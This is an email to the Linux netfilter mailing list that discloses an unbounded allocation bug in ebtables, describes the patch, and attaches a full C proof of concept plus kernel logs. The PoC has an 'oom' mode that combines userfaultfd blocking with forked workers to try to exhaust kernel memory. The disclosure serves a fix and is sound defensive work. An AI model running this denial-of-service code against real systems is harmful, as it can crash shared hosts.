Received: from mail-pf1-f172.google.com (mail-pf1-f172.google.com [209.85.210.172])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 18D9D15E5BB
	for <netfilter-devel@vger.kernel.org>; Mon, 27 Jul 2026 18:09:50 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.172
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785175792; cv=none; b=M+1GTWKnpZNX9NrwAvxwOz7V/pbswGo7a0cdEfZNiFmBLVkpLq8akyMKqNVAkooU8OsNhRmYYd+w0hVRFGzWenQWR64kTz1Hqz+oo83hY1oAoimDTvWQeibE0ELskb3JKnyXvvTs0DB9n5/+2KZ7A+3QRFn2mg0HfqSgwoXR31E=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785175792; c=relaxed/simple;
	bh=xA5/WUkxj/N6iNlPzzPpGk5JBvv3OmwybsQk4oE3aSY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=PFuCwPJ2/rYm6RO9v1m4pgwot5HUeZrpwCK13yc1fJq0lUnjEt8sALs32qhOc0E10MqOm6EQSJzf/hCEJvkF5kfU4WRL896lmS+id/7ToMnYWbop1jeL01krQS7HXxFOyGX3es+dIPzhFngn6T5A5rsN4s9fH+PUDdya5qcWba0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=qZEoxIiy; arc=none smtp.client-ip=209.85.210.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="qZEoxIiy"
Received: by mail-pf1-f172.google.com with SMTP id d2e1a72fcca58-84e584c7a5bso1410075b3a.2
        for <netfilter-devel@vger.kernel.org>; Mon, 27 Jul 2026 11:09:50 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785175790; x=1785780590; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=twMxfY4vtsJfy4d/lEOwxWjVisCSZvSypJoCzes5Dxc=;
        b=qZEoxIiy/zCxWb8bdXfgEXRAAppNyP6AI9TbKGAHrqTTXEcIl/q7DN5QCYQbPgBpfJ
         +yNKoXD8yH6c9rknW/pxE9g7nbd8wUoNXpehK4dLudHLTYl23X1xlIhE+kJ537XEofP3
         9Qxl+Cdw+gMynbgNO8PdYa8/jPAkMhP9LRifJOfymA4qtS0q5ePV5LEC0NyE4SF1/T1H
         3g5DZUHVNYwifqN3bgTnpa+aK5/YOZ26LASbqVhA/1w5phpRd02VNp0exfPGlvBviOGr
         NlXtDY0MRzq7+uBSmkrYh7iM/4eExMkYLJnT8v9f03EN/nGj8J1iS1EuCh0XbOvD8P3i
         YQkA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785175790; x=1785780590;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=twMxfY4vtsJfy4d/lEOwxWjVisCSZvSypJoCzes5Dxc=;
        b=LHGCLeK6H1IuwkRTn3cjiHRgEn/xBsewiRZ0DtAY53gd/M7HzOIsx3XfvxZiv7n1/b
         VvGS0ohcltIKqNzY1Ma+w8hp163OiiMbWjOqve0dXB5vjpoBGaiLAznf5rfPfEENTJ3u
         O4rSfcnMzd7+zgsudfIGz9LkzIrBN5Mt8NcnPv1b28afNHFcuo24oul3LpI4f7wrlxp/
         PFcoQF5CR6EfxZGaTGCxILiOZ1IiBrNSOeGQBuVI2OWXNIezUms2sSVcVPLKMGfhGxoL
         xODMk5Aqf+/EmDY9F9QJYtxIuK5yCt0iXU6B4TwUldSxliv8ED3N2aXITJO5AzyxvEPc
         PkoA==
X-Gm-Message-State: AOJu0YzwsmPWWCYpS3KqQ6tGrYoCM9ppvlKiYZcOcQqfp7mJLDTGUj+w
	wxYHlNSk+Jhgrm5/41Sa9R8+NyuU3p8xiS09fIMQj6qVJxz8Jlmt0Dv2+pzM9S8686IUXA==
X-Gm-Gg: AR+sD13ExJPum0BLXw7HXYPmcQywrHU54uYOpuxoelCPSzajuJPOD+IxbFBV6GGHRJo
	0wJ8Xq6QlWr5z6hVe2sjXbkoSM9JOSxWlIETM4VPAVZu5eIStuRpwKED5rsjs+Igo9HiJAIrg+J
	H5qmfTzJJLWnAMFEWtmYbIU1DlW8pfF/ORzf35UU+aAWsdorMIwBIzc59dgHik4k6iz3HekupWK
	LMwZ8b+xKcwowOmY4MfVwgjNcWCNNlOjW53vdKCK6FDPI7XN6Pf8sd3QZ6PFVkrZ6yfs9DOh+Gg
	bqZD1VXJFSjj14HVuYGQQRWbJmOYfnHnogW1OOSqG+bpYgZrJo9QCXD50N405WXqRSMTVAJhIO2
	lcHjl/m9rBt/wBkagJV3brKn5WnpEfpa5wuULgK5vSI4RjW6UBXyVVGsR/V8YouggFUkv7dby4f
	h2Hw8hwmtdL3TbQepCurRA
X-Received: by 2002:a05:6a00:2daa:b0:845:e9ff:5d97 with SMTP id d2e1a72fcca58-84e8d060376mr395025b3a.12.1785175790248;
        Mon, 27 Jul 2026 11:09:50 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e5343a9c6sm3494198b3a.51.2026.07.27.11.09.46
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 11:09:49 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netfilter-devel@vger.kernel.org,
	bridge@lists.linux.dev
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	razor@blackwall.org,
	idosch@nvidia.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH nf 0/1] netfilter: ebtables: avoid unbounded counter allocations
Date: Tue, 28 Jul 2026 02:09:43 +0800
Message-ID: <cover.1785131981.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zihan Xi <zihanx@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated a issue in net/bridge/netfilter/ebtables.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

EBT_SO_SET_COUNTERS copies only a fixed struct ebt_replace header before it
allocates a temporary counter array. The user-controlled num_counters field is
used for that allocation before the target table is looked up and before it can
be compared with the table's real nentries value. A user with CAP_NET_ADMIN in
a user/net namespace can therefore request a very large allocation against any
table name, even a non-existent one.

EBT_SO_SET_ENTRIES has the same root cause in do_replace_finish(). After the
replacement blob is copied and validated, do_replace_finish() used
repl->num_counters to allocate counterstmp before find_table_lock() and before
checking it against t->private->nentries. That path can trigger the same
unbounded allocation before the kernel knows whether the table exists or how
many counters are valid for it.

Recent public patches on July 2, 2026 and July 4, 2026 also tightened
bounds for do_replace()/do_replace_finish() and do_update_counters()
individually, but the underlying issue is the same in both paths:
temporary counter arrays are allocated from user-controlled counts before
the kernel has resolved the real table and validated the real nentries
value.

Fix this by moving both temporary counter allocations after find_table_lock()
and after the num_counters-to-nentries validation. Invalid table names or
counter counts now fail with the existing semantic errors instead of first
attempting a large allocation. This is a setsockopt control-plane trigger, not
a packet-driven protocol-state trigger, so packetdrill cannot express the key
EBT_SO_SET_COUNTERS/EBT_SO_SET_ENTRIES inputs; the reproducer uses setsockopt()
directly.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <linux/userfaultfd.h>

#ifndef O_CLOEXEC
#define O_CLOEXEC 02000000
#endif

#define SOL_IP 0

#define EBT_TABLE_MAXNAMELEN 32
#define EBT_BASE_CTL 128
#define EBT_SO_SET_ENTRIES (EBT_BASE_CTL)
#define EBT_SO_SET_COUNTERS (EBT_SO_SET_ENTRIES + 1)
#define EBT_SO_GET_INFO (EBT_BASE_CTL)
#define EBT_SO_GET_ENTRIES (EBT_SO_GET_INFO + 1)

#define NF_BR_NUMHOOKS 6

struct ebt_counter {
	uint64_t pcnt;
	uint64_t bcnt;
};

struct ebt_replace {
	char name[EBT_TABLE_MAXNAMELEN];
	unsigned int valid_hooks;
	unsigned int nentries;
	unsigned int entries_size;
	void *hook_entry[NF_BR_NUMHOOKS];
	unsigned int num_counters;
	struct ebt_counter *counters;
	char *entries;
};

#define HUGE_NUM_COUNTERS 134217720U
#define HUGE_COUNTERS_LEN ((unsigned int)(sizeof(struct ebt_replace) + \
					  HUGE_NUM_COUNTERS * sizeof(struct ebt_counter)))
#define TINY_ENTRIES_SIZE 1U
#define HUGE_REPLACE_LEN ((unsigned int)(sizeof(struct ebt_replace) + \
					 TINY_ENTRIES_SIZE))

_Static_assert(sizeof(struct ebt_replace) == 120, "unexpected ebt_replace size");
_Static_assert(HUGE_COUNTERS_LEN == 2147483640U,
	       "unexpected huge setsockopt length");

struct table_info {
	unsigned int nentries;
	unsigned int entries_size;
	unsigned int valid_hooks;
};

struct blocker_state {
	int uffd;
	long page_size;
	void *fault_page;
	char *copy_page;
	volatile sig_atomic_t release_fault;
	volatile sig_atomic_t fault_seen;
	volatile sig_atomic_t blocker_started;
	struct ebt_replace *req;
	socklen_t optlen;
	int blocker_ret;
	int blocker_errno;
};

static void fatal(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static int make_inet_socket(void)
{
	int fd = socket(AF_INET, SOCK_STREAM, 0);

	if (fd < 0)
		fatal("socket(AF_INET, SOCK_STREAM)");
	return fd;
}

static void get_table_info(const char *name, struct table_info *info)
{
	struct ebt_replace req;
	socklen_t len = sizeof(req);
	int fd = make_inet_socket();

	memset(&req, 0, sizeof(req));
	snprintf(req.name, sizeof(req.name), "%s", name);

	if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &req, &len) != 0)
		fatal("getsockopt(EBT_SO_GET_INFO)");

	close(fd);

	info->nentries = req.nentries;
	info->entries_size = req.entries_size;
	info->valid_hooks = req.valid_hooks;
}

static int do_huge_update(const char *name, bool log_result)
{
	struct ebt_replace req;
	int fd = make_inet_socket();
	int saved_errno;
	int ret;

	memset(&req, 0, sizeof(req));
	snprintf(req.name, sizeof(req.name), "%s", name);
	req.num_counters = HUGE_NUM_COUNTERS;
	req.counters = (struct ebt_counter *)0x10000;

	errno = 0;
	ret = setsockopt(fd, SOL_IP, EBT_SO_SET_COUNTERS, &req,
			 HUGE_COUNTERS_LEN);
	saved_errno = errno;
	close(fd);

	if (log_result)
		fprintf(stderr,
			"[worker] SET_COUNTERS name=%s len=%u num_counters=%u -> ret=%d errno=%d (%s)\n",
			name, HUGE_COUNTERS_LEN, HUGE_NUM_COUNTERS, ret,
			saved_errno, strerror(saved_errno));

	errno = saved_errno;
	return ret;
}

static int do_huge_replace(const char *name, bool log_result)
{
	struct ebt_replace req;
	char tiny_entries[TINY_ENTRIES_SIZE] = {0};
	int fd = make_inet_socket();
	int saved_errno;
	int ret;

	memset(&req, 0, sizeof(req));
	snprintf(req.name, sizeof(req.name), "%s", name);
	req.entries_size = TINY_ENTRIES_SIZE;
	req.entries = tiny_entries;
	req.num_counters = HUGE_NUM_COUNTERS;
	req.counters = (struct ebt_counter *)0x10000;

	errno = 0;
	ret = setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &req,
			 HUGE_REPLACE_LEN);
	saved_errno = errno;
	close(fd);

	if (log_result)
		fprintf(stderr,
			"[worker] SET_ENTRIES name=%s len=%u entries_size=%u num_counters=%u allocation=%zu -> ret=%d errno=%d (%s)\n",
			name, HUGE_REPLACE_LEN, TINY_ENTRIES_SIZE,
			HUGE_NUM_COUNTERS,
			(size_t)HUGE_NUM_COUNTERS * sizeof(struct ebt_counter),
			ret, saved_errno, strerror(saved_errno));

	errno = saved_errno;
	return ret;
}

static int open_userfaultfd(void)
{
	struct uffdio_api api;
	int fd;

	fd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (fd < 0) {
		fd = open("/dev/userfaultfd", O_RDWR | O_CLOEXEC | O_NONBLOCK);
		if (fd < 0)
			fatal("userfaultfd/open(/dev/userfaultfd)");
		fd = ioctl(fd, USERFAULTFD_IOC_NEW, O_CLOEXEC | O_NONBLOCK);
		if (fd < 0)
			fatal("USERFAULTFD_IOC_NEW");
	}

	memset(&api, 0, sizeof(api));
	api.api = UFFD_API;
	if (ioctl(fd, UFFDIO_API, &api) < 0)
		fatal("UFFDIO_API");

	return fd;
}

static void register_missing_page(struct blocker_state *st)
{
	struct uffdio_register reg;

	st->fault_page = mmap(NULL, st->page_size, PROT_READ | PROT_WRITE,
			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (st->fault_page == MAP_FAILED)
		fatal("mmap(fault_page)");
	if (munmap(st->fault_page, st->page_size) != 0)
		fatal("munmap(fault_page)");

	st->copy_page = calloc(1, (size_t)st->page_size);
	if (!st->copy_page)
		fatal("calloc(copy_page)");

	memset(&reg, 0, sizeof(reg));
	reg.range.start = (unsigned long)st->fault_page;
	reg.range.len = (unsigned long)st->page_size;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(st->uffd, UFFDIO_REGISTER, &reg) != 0)
		fatal("UFFDIO_REGISTER");
}

static void *uffd_handler_thread(void *arg)
{
	struct blocker_state *st = arg;

	while (!st->release_fault) {
		struct uffd_msg msg;
		struct pollfd pfd = { .fd = st->uffd, .events = POLLIN };
		int pr = poll(&pfd, 1, 100);

		if (pr < 0) {
			if (errno == EINTR)
				continue;
			fatal("poll(userfaultfd)");
		}
		if (pr == 0)
			continue;
		if (read(st->uffd, &msg, sizeof(msg)) != sizeof(msg))
			fatal("read(userfaultfd)");
		if (msg.event != UFFD_EVENT_PAGEFAULT)
			continue;

		st->fault_seen = 1;
		fprintf(stderr,
			"[blocker] userfaultfd trapped kernel copy_to_user at address 0x%llx\n",
			(unsigned long long)msg.arg.pagefault.address);

		while (!st->release_fault)
			usleep(10000);

		struct uffdio_copy copy;
		memset(&copy, 0, sizeof(copy));
		copy.src = (unsigned long)st->copy_page;
		copy.dst = (unsigned long)st->fault_page;
		copy.len = (unsigned long)st->page_size;
		if (ioctl(st->uffd, UFFDIO_COPY, &copy) != 0)
			fatal("UFFDIO_COPY");
		fprintf(stderr, "[blocker] released the trapped GET_ENTRIES fault\n");
		break;
	}

	return NULL;
}

static void *blocker_thread(void *arg)
{
	struct blocker_state *st = arg;
	int fd = make_inet_socket();

	st->blocker_started = 1;
	errno = 0;
	st->blocker_ret = getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES,
				       st->req, &st->optlen);
	st->blocker_errno = errno;
	fprintf(stderr,
		"[blocker] getsockopt(EBT_SO_GET_ENTRIES) returned ret=%d errno=%d (%s)\n",
		st->blocker_ret, st->blocker_errno, strerror(st->blocker_errno));
	close(fd);
	return NULL;
}

static uint64_t read_meminfo_kb(const char *key)
{
	char name[128];
	uint64_t value;
	FILE *f = fopen("/proc/meminfo", "r");

	if (!f)
		fatal("fopen(/proc/meminfo)");
	while (fscanf(f, "%127s %" SCNu64 " kB", name, &value) == 2) {
		name[strcspn(name, ":")] = '\0';
		if (strcmp(name, key) == 0) {
			fclose(f);
			return value;
		}
	}
	fclose(f);
	fatal("read_meminfo_kb");
	return 0;
}

static void kill_children(pid_t *children, int n)
{
	int i;

	for (i = 0; i < n; i++)
		if (children[i] > 0)
			kill(children[i], SIGKILL);
}

static void reap_children(pid_t *children, int n)
{
	int i;

	for (i = 0; i < n; i++)
		if (children[i] > 0)
			waitpid(children[i], NULL, 0);
}

static void run_oom_mode(int workers, int timeout_sec)
{
	struct blocker_state st;
	struct table_info filter;
	pthread_t blocker_tid;
	pthread_t uffd_tid;
	pid_t *children;
	uint64_t mem_before, mem_after;
	int i;

	if (workers <= 0)
		fatal("workers must be positive");

	memset(&st, 0, sizeof(st));
	get_table_info("filter", &filter);

	fprintf(stderr,
		"[setup] filter table: nentries=%u entries_size=%u valid_hooks=0x%x\n",
		filter.nentries, filter.entries_size, filter.valid_hooks);
	fprintf(stderr,
		"[setup] huge update request: len=%u num_counters=%u allocation=%zu bytes\n",
		HUGE_COUNTERS_LEN, HUGE_NUM_COUNTERS,
		(size_t)HUGE_NUM_COUNTERS * sizeof(struct ebt_counter));

	st.page_size = sysconf(_SC_PAGESIZE);
	if (st.page_size <= 0)
		fatal("sysconf(_SC_PAGESIZE)");

	st.uffd = open_userfaultfd();
	register_missing_page(&st);

	st.req = calloc(1, sizeof(*st.req));
	if (!st.req)
		fatal("calloc(blocker request)");

	snprintf(st.req->name, sizeof(st.req->name), "%s", "filter");
	st.req->nentries = filter.nentries;
	st.req->entries_size = filter.entries_size;
	st.req->num_counters = 0;
	st.req->entries = st.fault_page;
	st.optlen = sizeof(*st.req) + filter.entries_size;

	if (pthread_create(&uffd_tid, NULL, uffd_handler_thread, &st) != 0)
		fatal("pthread_create(uffd)");
	if (pthread_create(&blocker_tid, NULL, blocker_thread, &st) != 0)
		fatal("pthread_create(blocker)");

	for (i = 0; i < timeout_sec * 100; i++) {
		if (st.fault_seen)
			break;
		usleep(10000);
	}
	if (!st.fault_seen) {
		fprintf(stderr,
			"[setup] blocker did not hit the userfaultfd trap within %d seconds\n",
			timeout_sec);
		st.release_fault = 1;
		pthread_join(blocker_tid, NULL);
		pthread_join(uffd_tid, NULL);
		exit(EXIT_FAILURE);
	}

	mem_before = read_meminfo_kb("MemAvailable");
	fprintf(stderr, "[state] MemAvailable before workers: %" PRIu64 " kB\n",
		mem_before);

	children = calloc((size_t)workers, sizeof(*children));
	if (!children)
		fatal("calloc(children)");

	for (i = 0; i < workers; i++) {
		pid_t pid = fork();

		if (pid < 0)
			fatal("fork");
		if (pid == 0) {
			do_huge_update("bogus", true);
			_exit(EXIT_SUCCESS);
		}
		children[i] = pid;
		fprintf(stderr, "[parent] spawned worker pid=%d\n", pid);
	}

	sleep(2);
	mem_after = read_meminfo_kb("MemAvailable");
	fprintf(stderr,
		"[state] MemAvailable after workers: %" PRIu64 " kB (delta=%" PRIi64 " kB)\n",
		mem_after, (int64_t)mem_after - (int64_t)mem_before);
	fprintf(stderr, "[state] waiting up to %d seconds for an OOM-induced crash\n",
		timeout_sec);

	sleep(timeout_sec);

	fprintf(stderr, "[cleanup] timeout expired without a kernel panic; releasing blocker\n");
	st.release_fault = 1;
	pthread_join(blocker_tid, NULL);
	pthread_join(uffd_tid, NULL);
	kill_children(children, workers);
	reap_children(children, workers);
	free(children);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage:\n"
		"  %s counters [table]\n"
		"  %s replace [table]\n"
		"  %s oom [workers] [timeout_sec]\n",
		prog, prog, prog);
}

int main(int argc, char **argv)
{
	if (argc < 2) {
		do_huge_update("bogus", true);
		do_huge_replace("bogus", true);
		return EXIT_FAILURE;
	}

	if (strcmp(argv[1], "counters") == 0) {
		const char *name = (argc >= 3) ? argv[2] : "bogus";
		int ret = do_huge_update(name, true);

		return (ret == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
	}

	if (strcmp(argv[1], "replace") == 0) {
		const char *name = (argc >= 3) ? argv[2] : "bogus";
		int ret = do_huge_replace(name, true);

		return (ret == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
	}

	if (strcmp(argv[1], "oom") == 0) {
		int workers = (argc >= 3) ? atoi(argv[2]) : 3;
		int timeout_sec = (argc >= 4) ? atoi(argv[3]) : 10;

		run_oom_mode(workers, timeout_sec);
		return EXIT_SUCCESS;
	}

	usage(argv[0]);
	return EXIT_FAILURE;
}
------END poc.c--------

----BEGIN crash log----
EBT_SO_SET_COUNTERS path:
[    1.577403] poc: vmalloc error: size 2147483520, exceeds total pages, mode:0xcc0(GFP_KERNEL), nodemask=(null),cpuset=/,mems_allowed=0
[    1.578954] CPU: 1 UID: 0 PID: 64 Comm: poc Not tainted 7.2.0-rc4-00390-g743916aa8e8c #4 PREEMPT(lazy) 
[    1.579038] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    1.579145] Call Trace:
[    1.579555]  <TASK>
[    1.579713]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[    1.579934]  warn_alloc (mm/page_alloc.c:4023)
[    1.579949]  __vmalloc_node_range_noprof (mm/vmalloc.c:4019)
[    1.579960]  ? folio_add_file_rmap_ptes (include/linux/vmstat.h:542 (discriminator 1) mm/rmap.c:1336 (discriminator 1) mm/rmap.c:1428 (discriminator 1) mm/rmap.c:1706 (discriminator 1) mm/rmap.c:1732 (discriminator 1))
[    1.579969]  ? do_update_counters.constprop.0 (net/bridge/netfilter/ebtables.c:1395 (discriminator 2))
[    1.579977]  ? filemap_map_pages (include/linux/rcupdate.h:873 mm/filemap.c:3984)
[    1.579992]  __vmalloc_node_noprof (mm/vmalloc.c:4143 (discriminator 4))
[    1.580006]  ? do_update_counters.constprop.0 (net/bridge/netfilter/ebtables.c:1395 (discriminator 2))
[    1.580011]  do_update_counters.constprop.0 (net/bridge/netfilter/ebtables.c:1395 (discriminator 2))
[    1.580020]  update_counters (net/bridge/netfilter/ebtables.c:1444)
[    1.580030]  nf_setsockopt (net/netfilter/nf_sockopt.c:101)
[    1.580052]  do_sock_setsockopt (net/socket.c:2368)
[    1.580066]  __sys_setsockopt (net/socket.c:2393)
[    1.580075]  __x64_sys_setsockopt (net/socket.c:2399 net/socket.c:2396 net/socket.c:2396)
[    1.580082]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[    1.580090]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    1.580208] RIP: 0033:0x43523e
[    1.580370] Code: ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
[    1.580416] RSP: 002b:00007ffd9e4c8f48 EFLAGS: 00000246 ORIG_RAX: 0000000000000036
[    1.580438] RAX: ffffffffffffffda RBX: 00007ffd9e4c8f50 RCX: 000000000043523e
[    1.580447] RDX: 0000000000000081 RSI: 0000000000000000 RDI: 0000000000000003
[    1.580454] RBP: 00007ffd9e4cafd7 R08: 000000007ffffff8 R09: 0000000000000000
[    1.580461] R10: 00007ffd9e4c8f50 R11: 0000000000000246 R12: 0000000000000003
[    1.580469] R13: 00007ffd9e4c9278 R14: 00000000004de808 R15: 0000000000000001
[    1.580500]  </TASK>
[worker] setsockopt(name=bogus, len=2147483640, num_counters=134217720) -> ret=-1 errno=12 (Cannot allocate memory)
EXIT 1

EBT_SO_SET_ENTRIES path:
[    8.275233] poc: vmalloc error: size 2147483520, exceeds total pages, mode:0xcc0(GFP_KERNEL), nodemask=(null),cpuset=/,mems_allowed=0
[    8.297875] CPU: 1 UID: 0 PID: 62 Comm: poc Not tainted 7.2.0-rc4-00390-g743916aa8e8c #4 PREEMPT(lazy) 
[    8.297957] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    8.298283] Call Trace:
[    8.298471]  <TASK>
[    8.298471]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[    8.298471]  warn_alloc (mm/page_alloc.c:4023)
[    8.298471]  ? alloc_pages_bulk_noprof (mm/page_alloc.c:5338 mm/page_alloc.c:5230)
[    8.298471]  __vmalloc_node_range_noprof (mm/vmalloc.c:4019)
[    8.298471]  ? do_replace_finish (net/bridge/netfilter/ebtables.c:1024 (discriminator 2))
[    8.298471]  ? __vmalloc_node_range_noprof (mm/vmalloc.c:694 mm/vmalloc.c:703 mm/vmalloc.c:3924 mm/vmalloc.c:4082)
[    8.298471]  __vmalloc_node_noprof (mm/vmalloc.c:4143 (discriminator 4))
[    8.298471]  ? do_replace_finish (net/bridge/netfilter/ebtables.c:1024 (discriminator 2))
[    8.298471]  do_replace_finish (net/bridge/netfilter/ebtables.c:1024 (discriminator 2))
[    8.298471]  ? do_replace (net/bridge/netfilter/ebtables.c:1145 (discriminator 2))
[    8.298471]  do_replace (net/bridge/netfilter/ebtables.c:1156)
[    8.298471]  nf_setsockopt (net/netfilter/nf_sockopt.c:101)
[    8.298471]  do_sock_setsockopt (net/socket.c:2368)
[    8.298471]  __sys_setsockopt (net/socket.c:2393)
[    8.298471]  __x64_sys_setsockopt (net/socket.c:2399 net/socket.c:2396 net/socket.c:2396)
[    8.298471]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[    8.298471]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    8.298471] RIP: 0033:0x4307be
[    8.298471] Code: ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
[    8.298471] RSP: 002b:00007ffc525761e8 EFLAGS: 00000246 ORIG_RAX: 0000000000000036
[    8.298471] RAX: ffffffffffffffda RBX: 00000000031ae378 RCX: 00000000004307be
[    8.298471] RDX: 0000000000000080 RSI: 0000000000000000 RDI: 0000000000000003
[    8.298471] RBP: 00007ffc52576280 R08: 0000000000000079 R09: 0000000000000000
[    8.298471] R10: 00007ffc52576280 R11: 0000000000000246 R12: 0000000000000003
[    8.298471] R13: 00007ffc52577fd7 R14: 00000000004de808 R15: 0000000000000001
[    8.298471]  </TASK>
[worker] SET_ENTRIES name=bogus len=121 entries_size=1 num_counters=134217720 allocation=2147483520 -> ret=-1 errno=12 (Cannot allocate memory)
EXIT 1
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  netfilter: ebtables: avoid unbounded counter allocations

 net/bridge/netfilter/ebtables.c | 34 ++++++++++++++++-----------------
 1 file changed, 17 insertions(+), 17 deletions(-)

-- 
2.43.0
